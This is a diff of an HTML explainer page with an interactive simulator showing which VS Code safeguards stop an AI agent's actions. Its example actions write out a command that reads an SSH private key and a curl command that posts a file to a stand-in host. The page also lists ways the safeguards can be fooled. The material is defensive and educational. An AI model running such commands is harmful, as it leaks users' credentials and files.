@@ -145,20 +145,20 @@ a.sec-link:focus-visible{outline:2px solid currentColor;outline-offset:3px;borde
 </head>
 <body>
 <div class="page">
-  <div class="top"><a href="index.html">Kim Syversen</a><span>Current as of <time datetime="2026-11-15">15 Nov 2026</time></span></div>
+  <div class="top"><a href="index.html">Kim Syversen</a><span>Current as of <time datetime="2026-11-18">18 Nov 2026</time></span></div>
 
   <header class="hero">
     <h1>Which VS Code safeguards stop an AI agent?</h1>
-    <p class="lede">VS Code has two safeguards for AI agents. Approval asks you before an action runs. The sandbox limits which files and network a command can reach. Pick an action and settings below to see which safeguard stops it.</p>
+    <p class="lede">Workspace Trust determines whether an agent can start. Once it starts, approval rules determine when it needs your permission. Sandboxing limits the files and network destinations a covered process can reach.</p>
   </header>
 
   <section id="two-questions">
-    <div class="ph"><h2 id="h-two-questions"><a class="sec-link" href="#two-questions">The two safeguards: approval and sandbox</a></h2></div>
+    <div class="ph"><h2 id="h-two-questions"><a class="sec-link" href="#two-questions">Approval and sandboxing</a></h2></div>
     <div class="two">
       <div>
         <p class="lbl">Approval</p>
         <p class="q">&ldquo;Can this action run without asking for confirmation?&rdquo;</p>
-        <p>Approval is checked before an action starts. After a yes it does nothing more.</p>
+        <p>A one-time approval covers the current request. A saved approval can cover later requests within its scope.</p>
       </div>
       <div>
         <p class="lbl">Sandbox <span class="tag">[preview]</span></p>
@@ -170,7 +170,7 @@ a.sec-link:focus-visible{outline:2px solid currentColor;outline-offset:3px;borde
   </section>
 
   <section id="course">
-    <div class="ph"><h2 id="h-course"><a class="sec-link" href="#course">Try it: pick an action and settings, see what happens</a></h2><p style="margin-top:8px">Every action passes four checks in order.</p></div>
+    <div class="ph"><h2 id="h-course"><a class="sec-link" href="#course">Try it: pick an action and settings, see what happens</a></h2></div>
     <div class="sim">
       <form id="ctl" autocomplete="off">
         <fieldset class="grp acts" id="f-act"><legend class="lbl">Action the agent tries</legend></fieldset>
@@ -196,7 +196,7 @@ a.sec-link:focus-visible{outline:2px solid currentColor;outline-offset:3px;borde
             <li class="gate" data-g="review"><div class="body"><h3 id="gate-review"><a class="sec-link" href="#gate-review">4. Can you undo it?</a></h3><div class="out"></div></div></li>
           </ol>
         </div>
-        <p class="scope">Applies to Copilot harness sessions with the default tools. Other harnesses behave differently.</p>
+        <p class="scope">These examples use the Copilot harness in editor chat with its default tools and a local Unix shell. They assume no prior grants or organization policy. When allowed, the example agent requests a one-time retry outside the sandbox. The MCP example uses a workspace-configured server started by VS Code with the default server sandbox setting.</p>
       </div>
     </div>
   </section>
@@ -212,16 +212,16 @@ a.sec-link:focus-visible{outline:2px solid currentColor;outline-offset:3px;borde
       <thead><tr><th>System</th><th>Status</th><th>Needs</th></tr></thead>
       <tbody>
         <tr><td>macOS</td><td>Preview</td><td>macOS 15 or later</td></tr>
-        <tr><td>Linux and WSL2</td><td>Preview</td><td>glibc, <code>bubblewrap</code> 0.5.0 or later, <code>slirp4netns</code></td></tr>
-        <tr><td>Windows</td><td>Experimental</td><td>Windows 11, 25H2 build 26200.9550 or later</td></tr>
-        <tr><td>Alpine (musl) and WSL1</td><td>Not supported</td><td></td></tr>
+        <tr><td>Linux and WSL2</td><td>Preview</td><td>glibc, <code>bubblewrap</code> 0.5.0+, <code>slirp4netns</code>, util-linux 2.35+, compatible <code>iptables</code> tools, unprivileged user and network namespaces, and read/write access to <code>/dev/net/tun</code></td></tr>
+        <tr><td>Windows</td><td>Experimental</td><td>Windows 11 with BaseContainer. Minimum builds are 26200.9550 for 25H2 and 28000.3086 for 26H1.</td></tr>
+        <tr><td>musl-based Linux (including Alpine) and WSL1</td><td>Not supported</td><td></td></tr>
       </tbody>
     </table></div>
     <div class="rows" id="plat" style="margin-top:22px;border-top:0"></div>
   </section>
 
   <section id="baseline">
-    <div class="ph"><p class="lbl">From the VS Code docs</p><h2 id="h-baseline"><a class="sec-link" href="#baseline">Six settings the VS Code docs recommend</a></h2></div>
+    <div class="ph"><p class="lbl">From the VS Code docs</p><h2 id="h-baseline"><a class="sec-link" href="#baseline">Six steps the VS Code docs recommend</a></h2></div>
     <ol class="base">
       <li><span>Open untrusted projects in restricted mode.</span></li>
       <li><span>Use agent sandboxing and configure network access. <span class="tag">[preview]</span></span></li>
@@ -245,7 +245,7 @@ a.sec-link:focus-visible{outline:2px solid currentColor;outline-offset:3px;borde
       <li><a href="https://code.visualstudio.com/docs/editing/workspaces/workspace-trust">Workspace Trust</a></li>
       <li><a href="https://github.com/microsoft/vscode/tree/d03edc4b18d687c45af067195bad9544b5b07475">VS Code source code</a>, commit <code>d03edc4</code> of 15 Nov 2026</li>
     </ul>
-    <p class="src" style="margin-top:14px">Docs pages dated 11 Nov 2026 by Microsoft and read on 15 Nov 2026.</p>
+    <p class="src" style="margin-top:14px">Microsoft documentation checked on 18 Nov 2026.</p>
   </section>
 
   <footer>
@@ -276,11 +276,10 @@ all:["ap","Runs all tool calls without confirmation."],
 termdefault:["ap","By default, common read-only commands run automatically, while risky commands such as rm and del require approval."],
 runtime:["ap","In Copilot harness sessions, the runtime can approve read-only commands or sandboxed commands before terminal approval rules are evaluated."],
 besteffort:["ap","Terminal auto-approval is a best-effort convenience, not a security boundary."],
-urlreq:["ap","Prevents data from being sent to an untrusted site."],
-urlres:["ap","Helps prevent prompt injection from untrusted content."],
+fetchonce:["ap","Allow Once is the default action for terminal commands, web fetches, and file access requests."],
 sensitive:["rv","Sensitive-file approval happens before the agent saves an edit, rather than during review."],
 editauto:["ts","File edits might be auto-approved."],
-builtin:["se","Built-in agent tools can only read and write files within the current workspace folder."],
+assistedwrite:["src","return attributePermissionResult({ kind: 'approve-once' }, 'assisted_approval');","https://github.com/microsoft/vscode/blob/d03edc4b18d687c45af067195bad9544b5b07475/src/vs/platform/agentHost/node/copilot/copilotAgentSession.ts#L8743-L8772"],
 privs:["se","The agent can execute terminal commands and shell scripts with your user privileges"],
 cwd:["sb","The sandbox automatically grants read and write access to the current working directory."],
 ssh:["ts","It protects sensitive locations, such as SSH keys and shell configuration, and applies to child processes such as package managers and build scripts."],
@@ -325,13 +324,13 @@ function quote(id){return '<blockquote>&ldquo;'+esc(Q[id][1])+'&rdquo; <a href="
 function tag(t){return ' <span class="tag">['+t+']</span>'}
 
 var ACTS=[
- {id:"status",kind:"term",cmd:"git status",what:"Look at the repo",done:"Nothing changed."},
- {id:"rm",kind:"term",cmd:"rm -rf dist",what:"Delete a folder in the project",done:"dist is gone."},
- {id:"ssh",kind:"term",cmd:"cat ~/.ssh/id_ed25519",what:"Read your SSH key",done:"The agent has read your private key."},
- {id:"curl",kind:"term",cmd:"curl -d @notes.txt https://paste.example",what:"Send a file to another server",done:"notes.txt is on someone else's server."},
- {id:"env",kind:"edit",cmd:"edit .env",what:"Change a file with secrets, using the edit tool",done:".env is changed on disk."},
- {id:"fetch",kind:"fetch",cmd:"fetch https://example.com/docs",what:"Read a web page, using the fetch tool",done:"The page text is in the chat. It may hold instructions."},
- {id:"mcp",kind:"mcp",cmd:"mcp: create_issue",what:"Call a tool on a local MCP server",done:"The server did what the tool does."}
+ {id:"status",kind:"term",cmd:"git status",what:"Look at the repo",done:"The command can report repository status."},
+ {id:"rm",kind:"term",cmd:"rm -rf dist",what:"Delete a folder in the project",done:"The command can remove dist from the project."},
+ {id:"ssh",kind:"term",cmd:"cat ~/.ssh/id_ed25519",what:"Read your SSH key",done:"The command can read the key if your account has access."},
+ {id:"curl",kind:"term",cmd:"curl -d @notes.txt https://paste.example",what:"Send a file to another server",done:"The command can attempt to send notes.txt to the example destination."},
+ {id:"env",kind:"edit",cmd:"edit .env",what:"Change a file with secrets, using the edit tool",done:"The edit can change .env on disk before review."},
+ {id:"fetch",kind:"fetch",cmd:"fetch https://example.com/docs",what:"Read a web page, using the fetch tool",done:"A successful fetch can add untrusted page content to the chat."},
+ {id:"mcp",kind:"mcp",cmd:"mcp: create_issue",what:"Call a tool on a local MCP server",done:"The server can attempt to create the issue with its available permissions and network access."}
 ];
 /* The VS Code setting behind a control, and the docs page that names it. */
 var SETS={level:["chat.permissions.default","ap"],env:["chat.tools.edits.autoApprove","rv"],sandbox:["chat.agent.sandbox.enabled","sb"],net:["chat.agent.sandbox.network.allowNetwork","sb"],esc:["chat.agent.sandbox.allowUnsandboxedCommands","sb"]};
@@ -346,9 +345,9 @@ var OPTS={
  answer:[["yes","Yes"],["no","No"]]
 };
 var PRESETS=[
- ["VS Code defaults",{trust:"trusted",level:"manual",env:"off",sandbox:"off",net:"open",esc:"ask"}],
+ ["Manual, trusted workspace",{trust:"trusted",level:"manual",env:"off",sandbox:"off",net:"open",esc:"ask"}],
  ["Allow all, no sandbox",{trust:"trusted",level:"all",env:"off",sandbox:"off",net:"open",esc:"ask",answer:"yes"}],
- ["Strictest settings",{trust:"trusted",level:"manual",env:"on",sandbox:"on",net:"blocked",esc:"never"}]
+ ["Sandbox, network blocked",{trust:"trusted",level:"manual",env:"on",sandbox:"on",net:"blocked",esc:"never"}]
 ];
 var st={act:"curl",trust:"trusted",level:"manual",judge:"yes",env:"off",sandbox:"off",net:"open",esc:"ask",answer:"yes"};
 
@@ -367,16 +366,16 @@ function evaluate(s){
   // 2 approval
   var ok=true;
   if(s.level==="all"){
-    if(a.id==="env") push("approval","pass","Allow all skips every approval, also for files with secrets.",["all","allsens"]);
-    else push("approval","pass","Allow all skips every approval. VS Code does not ask you.",["all"]);
+    if(a.id==="env") push("approval","pass","Allow all skips the approval for this workspace edit, including the sensitive-file rule.",["all","allsens"]);
+    else push("approval","pass","Allow all skips the initial tool approval.",["all"]);
   }
   else if(s.level==="assisted"){
     if(s.judge==="no") ok=asked("approval","An AI reviewer checked the action and did not approve it, so VS Code asks you.",["assisted"]);
-    else if(a.id==="env"&&s.env==="on") push("approval","judge","An AI reviewer checked the action and approved it, so your .env rule is skipped."+tag("inference"),["assisted","assistedrisk"]);
+    else if(a.id==="env"&&s.env==="on") push("approval","judge","An AI reviewer checked the action and approved it, so your .env rule is skipped."+tag("inference"),["assisted","assistedwrite"]);
     else push("approval","judge","An AI reviewer checked the action and approved it. VS Code does not ask you.",["assisted","assistedrisk"]);
   }
   else if(term&&s.sandbox==="on") push("approval","pass","VS Code does not ask, because the command runs inside the sandbox.",["runtime","sandboxauto"]);
-  else if(a.id==="status") push("approval","pass","git status only reads, so it runs without asking you.",["termdefault"]);
+  else if(a.id==="status") push("approval","pass","The default rules allow git status without prompting.",["termdefault"]);
   else if(a.id==="rm") ok=asked("approval","rm deletes files, so VS Code asks you first.",["termdefault"]);
   else if(a.id==="ssh") push("approval","pass","cat is on the built-in list of read-only commands, so it runs without asking you.",["rulecat","termdefault"]);
   else if(term) ok=asked("approval","curl is on the built-in list of commands that need approval, so VS Code asks you.",["rulecurl","manual"]);
@@ -384,23 +383,23 @@ function evaluate(s){
     if(s.env==="on") ok=asked("approval","Your rule for .env makes VS Code show the change and ask you before it is saved.",["sensitive"]);
     else push("approval","pass","No rule covers .env, so the edit is saved without asking you."+tag("inference"),["editauto"]);
   }
-  else if(a.id==="mcp") ok=asked("approval","A tool on an MCP server needs your approval. You can approve it once or for a longer period.",["mcpask"]);
-  else ok=asked("approval","VS Code asks twice: may the agent contact the site, and may the response go into the chat?",["urlreq","urlres"]);
+  else if(a.id==="mcp") ok=asked("approval","This MCP tool has no prior approval. VS Code asks before calling it.",["mcpask"]);
+  else ok=asked("approval","Copilot asks for approval to fetch from this host.",["fetchonce"]);
   if(!ok) return{g:g,ran:false,why:why,asks:asks,a:a};
   // 3 sandbox
   if(a.id==="mcp"){
-    if(s.sandbox==="off") push("sandbox","open","The sandbox is off, which is the default. The MCP server runs with your user rights.",["mcpbroad"]);
-    else{fenced=true;push("sandbox","pass","VS Code started the server inside the sandbox. A server you start yourself is outside it.",["mcpsb","mcpown"])}
+    if(s.sandbox==="off") push("sandbox","open","With both agent and per-server sandboxing off, this local MCP server runs with your user rights.",["mcpbroad"]);
+    else{fenced=true;push("sandbox","pass","VS Code started the server inside the sandbox. The agent sandbox does not cover independently started servers.",["mcpsb","mcpown"])}
   } else if(!term){
-    if(a.id==="env") push("sandbox","skip","The sandbox only covers commands. The edit tool is not a command, so the sandbox does not apply.",["notcovered","builtin"]);
+    if(a.id==="env") push("sandbox","skip","The edit tool uses VS Code’s file permissions directly.",["notcovered"]);
     else push("sandbox","skip","The fetch tool has its own network rules. The sandbox does not apply.",["fetchsep"]);
   } else if(s.sandbox==="off") push("sandbox","open","The sandbox is off, which is the default. The command runs with your user rights.",["privs"]);
   else {
     var blocked=(a.id==="ssh")||(a.id==="curl"&&s.net==="blocked");
     if(!blocked){
       fenced=true;
-      if(a.id==="curl") push("sandbox","pass","The sandbox allows network access by default, so the file is sent.",["netopen"]);
-      else push("sandbox","pass","The command only touches the project folder, which the sandbox allows"+(s.level==="all"?", also with Allow all.":"."),s.level==="all"?["cwd","indep"]:["cwd"]);
+      if(a.id==="curl") push("sandbox","pass","The sandbox allows network access by default, so the command can attempt the transfer.",["netopen"]);
+      else push("sandbox","pass","The sandbox permits access to the project folder"+(s.level==="all"?", also with Allow all.":"."),s.level==="all"?["cwd","indep"]:["cwd"]);
     } else {
       var bq=a.id==="ssh"?"ssh":"netblock",bs=a.id==="ssh"?"The sandbox blocks it. The SSH key is outside the folders the sandbox allows.":"The sandbox blocks it. Network access is turned off.";
       if(s.esc==="never"){push("sandbox","stop",bs+" Asking to run outside the sandbox is turned off.",[bq,"escoff"]);return{g:g,ran:false,why:"fence",asks:asks,a:a}}
@@ -410,20 +409,20 @@ function evaluate(s){
   }
   // 4 afterwards
   if(a.id==="env") push("review","after","You can choose Keep or Undo, but the file is already saved on disk.",["keep"]);
-  else if(a.id==="status") push("review","after","Nothing changed, so there is nothing to undo.",[]);
-  else push("review","after","This cannot be undone.",["noundo"]);
+  else if(a.id==="status") push("review","after","The command reports repository status.",[]);
+  else push("review","after","Restoring workspace files does not reverse this tool call.",["noundo"]);
   return{g:g,ran:true,asks:asks,a:a,fenced:fenced};
 }
-var LABEL={pass:"Allowed",ask:"VS Code asks you",stop:"Stopped",skip:"Does not apply",judge:"AI reviewer decides",open:"Sandbox is off",after:"After it ran"};
+var LABEL={pass:"Allowed",ask:"VS Code asks you",stop:"Stopped",skip:"Does not apply",judge:"AI reviewer decides",open:"Sandbox is off",after:"After execution"};
 function verdict(r){
   if(!r.ran){
-    if(r.why==="trust") return["Result: the agent is turned off.","Nothing ran."];
-    if(r.why==="fence") return["Result: blocked by the sandbox.","Nothing ran, and VS Code did not need to ask you."];
-    if(r.why==="fence-no") return["Result: blocked by the sandbox. You said no to running it outside.","Nothing ran."];
-    return["Result: stopped. You said no.","Nothing ran."];
+    if(r.why==="trust") return["Result: the agent is turned off.","The action was blocked."];
+    if(r.why==="fence") return["Result: blocked by the sandbox.","The requested access was blocked. An unsandboxed retry is disabled."];
+    if(r.why==="fence-no") return["Result: blocked by the sandbox. You said no to running it outside.","The action was blocked."];
+    return["Result: stopped. You said no.","The action was blocked."];
   }
   var judged=r.g.some(function(x){return x.state==="judge"});
-  var how=r.asks===0?(judged?"Result: the action ran. An AI reviewer approved it, not you.":"Result: the action ran. VS Code did not ask you."):r.asks===1?"Result: the action ran. You approved it.":"Result: the action ran. You approved it twice.";
+  var how=r.asks===0?(judged?"Result: the action is permitted. The AI reviewer approved it.":"Result: the action is permitted. VS Code did not ask you."):r.asks===1?"Result: the action is permitted. You approved it.":"Result: the action is permitted. You approved it twice.";
   return[how,r.a.done];
 }
 
@@ -491,16 +490,16 @@ window.addEventListener("resize",function(){render(false)});
 // static lists
 var HOLES=[
  ["The sandbox is not a virtual machine.","notvm"],
- ["A sandboxed command can still read your package registry tokens, unless you turn developer-tool access off.","devtool"],
+ ["Default developer-tool access can expose registry tokens in tool configuration and caches.","devtool"],
  ["Terminal approval rules can be fooled by a cleverly written command.","besteffort"],
  ["Assisted permissions lets an AI reviewer decide, and it can be wrong.","assistedrisk"],
  ["Restricted Mode does not hold back an extension that chooses to ignore it.","ext"],
  ["A Git worktree keeps code changes apart. It does not limit what a command can reach.","worktree"],
  ["Trusting a folder also lets the MCP servers it ships with start.","mcp"],
- ["Many approval questions wear you down, and you start saying yes without reading.","fatigue"]
+ ["Repeated prompts can make risky requests easier to overlook.","fatigue"]
 ];
 document.getElementById("holes").innerHTML=HOLES.map(function(h){return '<div class="row"><p>'+h[0]+'</p>'+quote(h[1])+'</div>'}).join("");
-document.getElementById("plat").innerHTML='<div class="row"><p>Not finished software on any system yet.</p>'+quote("status")+'</div>'+
+document.getElementById("plat").innerHTML='<div class="row"><p>For remote sessions, check the <a href="https://code.visualstudio.com/docs/agents/run/agent-sandboxing#check-platform-availability">prerequisites on the machine running the commands</a>.</p>'+quote("status")+'</div>'+
  '<div class="row"><p>If the system lacks what the sandbox needs, the command stops. It does not run without the sandbox.</p>'+quote("nosilent")+'</div>';
 sync();render(false);
 })();
